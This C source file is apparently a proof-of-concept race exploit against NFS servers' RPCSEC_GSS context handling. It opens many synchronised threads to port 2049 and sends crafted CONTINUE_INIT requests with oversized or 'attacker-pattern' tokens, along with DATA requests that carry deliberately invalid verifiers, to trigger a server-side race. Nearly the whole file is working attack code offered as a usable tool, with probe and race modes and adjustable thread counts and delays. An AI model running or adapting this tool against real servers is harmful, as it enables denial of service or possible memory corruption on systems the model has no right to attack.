#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

enum {
    RPC_CALL = 0,
    RPC_VERSION = 2,
    NFS_PROGRAM = 100003,
    NFS_VERSION = 3,
    NFS_NULL = 0,
    RPCSEC_GSS = 6,
    RPCSEC_GSS_VERSION = 1,
    RPCSEC_GSS_DATA = 0,
    RPCSEC_GSS_CONTINUE_INIT = 2,
    RPCSEC_GSS_SVC_NONE = 1,
};

struct options {
    const char *host;
    const char *token_file;
    uint8_t *token_data;
    size_t token_data_len;
    uint32_t handle;
    uint32_t token_len;
    uint32_t alt_token_len;
    uint32_t invalid_token_len;
    unsigned data_threads;
    unsigned valid_threads;
    unsigned invalid_threads;
    unsigned delay_us;
    unsigned rounds;
    unsigned timeout_sec;
    int use_alt_token_len;
    int quiet;
    int ignore_data_reply_errors;
    int stop_on_error;
    int probe_invalid;
    int probe_valid;
};

struct barrier {
    pthread_mutex_t mutex;
    pthread_cond_t condition;
    unsigned count;
    unsigned waiting;
    unsigned generation;
};

struct worker {
    const struct options *opts;
    struct barrier *barrier;
    unsigned id;
    int data;
    int invalid;
    int result;
    uint32_t token_len;
    uint32_t sequence;
    uint32_t reply_len;
    uint32_t reply_words[16];
    unsigned reply_word_count;
};

static atomic_uint next_xid = 0x52474300;
static atomic_uint next_sequence = 1;

static int
barrier_init(struct barrier *barrier, unsigned count)
{
    memset(barrier, 0, sizeof(*barrier));
    barrier->count = count;
    if (pthread_mutex_init(&barrier->mutex, NULL) != 0) {
        return -1;
    }
    if (pthread_cond_init(&barrier->condition, NULL) != 0) {
        pthread_mutex_destroy(&barrier->mutex);
        return -1;
    }
    return 0;
}

static void
barrier_wait(struct barrier *barrier)
{
    unsigned generation;

    pthread_mutex_lock(&barrier->mutex);
    generation = barrier->generation;
    barrier->waiting++;
    if (barrier->waiting == barrier->count) {
        barrier->waiting = 0;
        barrier->generation++;
        pthread_cond_broadcast(&barrier->condition);
    } else {
        while (generation == barrier->generation) {
            pthread_cond_wait(&barrier->condition, &barrier->mutex);
        }
    }
    pthread_mutex_unlock(&barrier->mutex);
}

static void
barrier_destroy(struct barrier *barrier)
{
    pthread_cond_destroy(&barrier->condition);
    pthread_mutex_destroy(&barrier->mutex);
}

static void
put_u32(uint8_t **cursor, uint32_t value)
{
    value = htonl(value);
    memcpy(*cursor, &value, sizeof(value));
    *cursor += sizeof(value);
}

static int
parse_u32_hex(const char *text, uint32_t *value)
{
    char *end = NULL;
    unsigned long parsed = strtoul(text, &end, 16);

    if (text[0] == '\0' || end == NULL || *end != '\0' ||
        parsed > UINT32_MAX) {
        return -1;
    }
    *value = (uint32_t)parsed;
    return 0;
}

static uint8_t *
build_request(uint32_t handle, uint32_t token_len, uint32_t xid,
    const uint8_t *token_data, size_t token_data_len, size_t *wire_len)
{
    size_t padded = (token_len + 3U) & ~3U;
    size_t body_len = 68U + padded;
    uint8_t *wire = calloc(1, 4U + body_len);
    uint8_t *cursor;
    uint32_t marker;

    if (wire == NULL) {
        return NULL;
    }

    marker = htonl(0x80000000U | (uint32_t)body_len);
    memcpy(wire, &marker, sizeof(marker));
    cursor = wire + 4;

    put_u32(&cursor, xid);
    put_u32(&cursor, RPC_CALL);
    put_u32(&cursor, RPC_VERSION);
    put_u32(&cursor, NFS_PROGRAM);
    put_u32(&cursor, NFS_VERSION);
    put_u32(&cursor, NFS_NULL);

    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, 24);
    put_u32(&cursor, RPCSEC_GSS_VERSION);
    put_u32(&cursor, RPCSEC_GSS_CONTINUE_INIT);
    put_u32(&cursor, 0);
    put_u32(&cursor, RPCSEC_GSS_SVC_NONE);
    put_u32(&cursor, 4);
    put_u32(&cursor, handle);

    put_u32(&cursor, 0);
    put_u32(&cursor, 0);

    put_u32(&cursor, token_len);
    if (token_data != NULL) {
        if (token_data_len != token_len) {
            free(wire);
            return NULL;
        }
        memcpy(cursor, token_data, token_len);
    } else {
        for (uint32_t i = 0; i < token_len; i++) {
            cursor[i] = (uint8_t)(0x41U + ((i + xid) % 23U));
        }
    }

    *wire_len = 4U + body_len;
    return wire;
}

static uint8_t *
build_data_request(uint32_t handle, uint32_t sequence, uint32_t xid,
    size_t *wire_len)
{
    const size_t body_len = 64U;
    uint8_t *wire = calloc(1, 4U + body_len);
    uint8_t *cursor;
    uint32_t marker;

    if (wire == NULL) {
        return NULL;
    }

    marker = htonl(0x80000000U | (uint32_t)body_len);
    memcpy(wire, &marker, sizeof(marker));
    cursor = wire + 4;

    put_u32(&cursor, xid);
    put_u32(&cursor, RPC_CALL);
    put_u32(&cursor, RPC_VERSION);
    put_u32(&cursor, NFS_PROGRAM);
    put_u32(&cursor, NFS_VERSION);
    put_u32(&cursor, NFS_NULL);

    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, 24);
    put_u32(&cursor, RPCSEC_GSS_VERSION);
    put_u32(&cursor, RPCSEC_GSS_DATA);
    put_u32(&cursor, sequence);
    put_u32(&cursor, RPCSEC_GSS_SVC_NONE);
    put_u32(&cursor, 4);
    put_u32(&cursor, handle);

    /* Deliberately invalid verifier; sequence validation runs first. */
    put_u32(&cursor, 0);
    put_u32(&cursor, 0);

    *wire_len = 4U + body_len;
    return wire;
}

static int
connect_server(const char *host, unsigned timeout_sec)
{
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_port = htons(2049),
    };
    struct timeval timeout = {
        .tv_sec = (time_t)timeout_sec,
        .tv_usec = 0,
    };
    int one = 1;
    int fd;

    if (inet_pton(AF_INET, host, &address.sin_addr) != 1) {
        fprintf(stderr, "invalid IPv4 address: %s\n", host);
        return -1;
    }

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return -1;
    }
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    if (connect(fd, (const struct sockaddr *)&address, sizeof(address)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int
send_all(int fd, const uint8_t *buffer, size_t length)
{
    while (length > 0) {
        ssize_t sent = send(fd, buffer, length, 0);
        if (sent <= 0) {
            return -1;
        }
        buffer += (size_t)sent;
        length -= (size_t)sent;
    }
    return 0;
}

static int
read_all(int fd, uint8_t *buffer, size_t length)
{
    while (length > 0) {
        ssize_t got = recv(fd, buffer, length, 0);
        if (got <= 0) {
            return -1;
        }
        buffer += (size_t)got;
        length -= (size_t)got;
    }
    return 0;
}

static int
read_reply(int fd, uint32_t *reply_len, uint32_t *reply_words,
    unsigned *reply_word_count)
{
    uint32_t marker;
    uint8_t *reply;
    size_t length;
    int result;

    if (read_all(fd, (uint8_t *)&marker, sizeof(marker)) < 0) {
        return -1;
    }
    marker = ntohl(marker);
    length = marker & 0x7fffffffU;
    if ((marker & 0x80000000U) == 0 || length > (1U << 20)) {
        return -2;
    }
    reply = malloc(length);
    if (reply == NULL) {
        return -3;
    }
    result = read_all(fd, reply, length);
    if (result < 0) {
        free(reply);
        return -1;
    }
    *reply_word_count = (unsigned)(length / sizeof(uint32_t));
    if (*reply_word_count > 16) {
        *reply_word_count = 16;
    }
    for (unsigned i = 0; i < *reply_word_count; i++) {
        uint32_t word;
        memcpy(&word, reply + (i * sizeof(word)), sizeof(word));
        reply_words[i] = ntohl(word);
    }
    free(reply);
    *reply_len = (uint32_t)length;
    return 0;
}

static void *
run_worker(void *opaque)
{
    struct worker *worker = opaque;
    uint32_t token_len = worker->data ? 0 :
        worker->invalid ? worker->opts->invalid_token_len :
        worker->opts->use_alt_token_len && (worker->id & 1U) ?
        worker->opts->alt_token_len : worker->opts->token_len;
    uint32_t xid = atomic_fetch_add(&next_xid, 1);
    uint8_t *request;
    size_t request_len;
    int fd;

    worker->token_len = token_len;
    fd = connect_server(worker->opts->host, worker->opts->timeout_sec);
    if (fd < 0) {
        worker->result = errno ? errno : EIO;
        return NULL;
    }
    request = NULL;
    if (!worker->data) {
        request = build_request(worker->opts->handle, token_len, xid,
            worker->invalid ? NULL : worker->opts->token_data,
            worker->invalid ? 0 : worker->opts->token_data_len,
            &request_len);
        if (request == NULL) {
            worker->result = ENOMEM;
            close(fd);
            return NULL;
        }
    }

    barrier_wait(worker->barrier);
    if (worker->data) {
        worker->sequence = atomic_fetch_add(&next_sequence, 255U);
        request = build_data_request(worker->opts->handle,
            worker->sequence, xid, &request_len);
        if (request == NULL) {
            worker->result = ENOMEM;
            close(fd);
            return NULL;
        }
    }
    if (worker->invalid && worker->opts->delay_us != 0) {
        usleep(worker->opts->delay_us);
    }
    if (send_all(fd, request, request_len) < 0) {
        worker->result = errno ? errno : EIO;
    } else {
        worker->result = read_reply(fd, &worker->reply_len,
            worker->reply_words, &worker->reply_word_count);
        if (worker->data && worker->opts->ignore_data_reply_errors &&
            worker->result != 0) {
            worker->result = 0;
        }
    }

    free(request);
    close(fd);
    return NULL;
}

static void
usage(const char *program)
{
    fprintf(stderr,
        "usage: %s HOST HANDLE_HEX MODE [options]\n"
        "  MODE: probe-invalid | probe-valid | race\n"
        "  --token-len N       even-worker token size (default 65535)\n"
        "  --alt-token-len N   odd-worker token size (default: disabled)\n"
        "  --token-file PATH   use exact token bytes for every valid worker\n"
        "  --data N            DATA workers reaching seqbit update (default 0)\n"
        "  --valid N           valid workers (default 8)\n"
        "  --invalid N         invalid workers (default 2)\n"
        "  --invalid-token-len N\n"
        "                      attacker-pattern token size (default 0)\n"
        "  --delay-us N        delay invalid workers (default 3000)\n"
        "  --rounds N          bounded rounds (default 1)\n"
        "  --timeout-sec N     socket timeout, 1..60 (default 3)\n"
        "  --quiet 0|1         suppress successful worker replies\n"
        "  --ignore-data-reply-errors 0|1\n"
        "                      count a sent DATA probe if its reply is dropped\n"
        "  --stop-on-error 0|1 stop after the first failing round\n",
        program);
}

int
main(int argc, char **argv)
{
    struct options opts = {
        .token_len = 65535,
        .valid_threads = 8,
        .invalid_threads = 2,
        .delay_us = 3000,
        .rounds = 1,
        .timeout_sec = 3,
    };
    unsigned total;

    if (argc < 4) {
        usage(argv[0]);
        return 64;
    }
    opts.host = argv[1];
    if (parse_u32_hex(argv[2], &opts.handle) < 0) {
        fprintf(stderr, "invalid handle: %s\n", argv[2]);
        return 64;
    }
    if (strcmp(argv[3], "probe-invalid") == 0) {
        opts.probe_invalid = 1;
    } else if (strcmp(argv[3], "probe-valid") == 0) {
        opts.probe_valid = 1;
    } else if (strcmp(argv[3], "race") != 0) {
        usage(argv[0]);
        return 64;
    }

    for (int i = 4; i + 1 < argc; i += 2) {
        unsigned long value = strtoul(argv[i + 1], NULL, 0);
        if (strcmp(argv[i], "--token-len") == 0) {
            opts.token_len = (uint32_t)value;
        } else if (strcmp(argv[i], "--alt-token-len") == 0) {
            opts.alt_token_len = (uint32_t)value;
            opts.use_alt_token_len = 1;
        } else if (strcmp(argv[i], "--data") == 0) {
            opts.data_threads = (unsigned)value;
        } else if (strcmp(argv[i], "--valid") == 0) {
            opts.valid_threads = (unsigned)value;
        } else if (strcmp(argv[i], "--invalid") == 0) {
            opts.invalid_threads = (unsigned)value;
        } else if (strcmp(argv[i], "--invalid-token-len") == 0) {
            opts.invalid_token_len = (uint32_t)value;
        } else if (strcmp(argv[i], "--delay-us") == 0) {
            opts.delay_us = (unsigned)value;
        } else if (strcmp(argv[i], "--rounds") == 0) {
            opts.rounds = (unsigned)value;
        } else if (strcmp(argv[i], "--timeout-sec") == 0) {
            opts.timeout_sec = (unsigned)value;
        } else if (strcmp(argv[i], "--quiet") == 0) {
            opts.quiet = value != 0;
        } else if (strcmp(argv[i], "--ignore-data-reply-errors") == 0) {
            opts.ignore_data_reply_errors = value != 0;
        } else if (strcmp(argv[i], "--stop-on-error") == 0) {
            opts.stop_on_error = value != 0;
        } else if (strcmp(argv[i], "--token-file") == 0) {
            FILE *file;
            long length;

            opts.token_file = argv[i + 1];
            file = fopen(opts.token_file, "rb");
            if (file == NULL || fseek(file, 0, SEEK_END) != 0 ||
                (length = ftell(file)) < 0 || length > 65535 ||
                fseek(file, 0, SEEK_SET) != 0) {
                if (file != NULL) {
                    fclose(file);
                }
                fprintf(stderr, "cannot read bounded token file: %s\n",
                    opts.token_file);
                return 64;
            }
            opts.token_data = malloc((size_t)length);
            if ((length != 0 && opts.token_data == NULL) ||
                (length != 0 &&
                fread(opts.token_data, 1, (size_t)length, file) !=
                (size_t)length)) {
                fclose(file);
                free(opts.token_data);
                fprintf(stderr, "cannot load token file: %s\n",
                    opts.token_file);
                return 64;
            }
            fclose(file);
            opts.token_data_len = (size_t)length;
            opts.token_len = (uint32_t)length;
            opts.use_alt_token_len = 0;
        } else {
            usage(argv[0]);
            return 64;
        }
    }

    if (opts.token_len > 65535 ||
        (opts.use_alt_token_len && opts.alt_token_len > 65535) ||
        opts.invalid_token_len > 65535 ||
        opts.rounds == 0 || opts.timeout_sec == 0 ||
        opts.timeout_sec > 60) {
        fprintf(stderr, "invalid bounded option\n");
        return 64;
    }
    if (opts.probe_invalid || opts.probe_valid) {
        opts.valid_threads = opts.probe_valid ? 1 : 0;
        opts.invalid_threads = opts.probe_invalid ? 1 : 0;
        opts.delay_us = 0;
        opts.rounds = 1;
    }
    total = opts.data_threads + opts.valid_threads + opts.invalid_threads;
    if (total == 0 || total > 256) {
        fprintf(stderr, "worker total must be 1..256\n");
        return 64;
    }

    printf("target=%s handle=%08x mode=%s data=%u valid=%u invalid=%u "
        "token_len=%u alt_token_len=%s%u invalid_token_len=%u "
        "delay_us=%u rounds=%u "
        "timeout_sec=%u\n",
        opts.host, opts.handle,
        opts.probe_invalid ? "probe-invalid" :
        opts.probe_valid ? "probe-valid" : "race",
        opts.data_threads, opts.valid_threads, opts.invalid_threads,
        opts.token_len,
        opts.use_alt_token_len ? "" : "disabled:",
        opts.alt_token_len,
        opts.invalid_token_len,
        opts.delay_us, opts.rounds, opts.timeout_sec);

    uint64_t total_successes = 0;
    uint64_t total_errors = 0;
    for (unsigned round = 0; round < opts.rounds; round++) {
        struct barrier barrier;
        pthread_t *threads = calloc(total, sizeof(*threads));
        struct worker *workers = calloc(total, sizeof(*workers));
        unsigned launched = 0;
        unsigned round_errors = 0;

        if (threads == NULL || workers == NULL ||
            barrier_init(&barrier, total) != 0) {
            fprintf(stderr, "round %u setup failed\n", round);
            free(threads);
            free(workers);
            return 1;
        }
        for (unsigned i = 0; i < total; i++) {
            workers[i].opts = &opts;
            workers[i].barrier = &barrier;
            workers[i].id = i;
            workers[i].data = i < opts.data_threads;
            workers[i].invalid =
                i >= opts.data_threads + opts.valid_threads;
            if (pthread_create(&threads[i], NULL, run_worker,
                &workers[i]) != 0) {
                break;
            }
            launched++;
        }
        if (launched != total) {
            fprintf(stderr, "round %u launched %u/%u workers\n",
                round, launched, total);
            return 1;
        }
        for (unsigned i = 0; i < total; i++) {
            pthread_join(threads[i], NULL);
            if (workers[i].result == 0) {
                total_successes++;
            } else {
                total_errors++;
                round_errors++;
            }
            if (!opts.quiet || workers[i].result != 0) {
                printf("round=%u worker=%u kind=%s token_len=%u "
                    "sequence=%u result=%d reply_len=%u\n",
                    round, i,
                    workers[i].data ? "data" :
                    workers[i].invalid ? "invalid" : "valid",
                    workers[i].token_len, workers[i].sequence,
                    workers[i].result, workers[i].reply_len);
                if (workers[i].reply_word_count > 0) {
                    printf("  reply_words:");
                    for (unsigned word = 0;
                        word < workers[i].reply_word_count; word++) {
                        printf(" %08x", workers[i].reply_words[word]);
                    }
                    printf("\n");
                }
            }
        }
        barrier_destroy(&barrier);
        free(threads);
        free(workers);
        if (opts.quiet && ((round + 1U) % 1000U == 0U ||
            round_errors != 0)) {
            printf("progress rounds=%u successes=%llu errors=%llu\n",
                round + 1U, (unsigned long long)total_successes,
                (unsigned long long)total_errors);
            fflush(stdout);
        }
        if (opts.stop_on_error && round_errors != 0) {
            break;
        }
    }
    printf("summary successes=%llu errors=%llu\n",
        (unsigned long long)total_successes,
        (unsigned long long)total_errors);

    return 0;
}
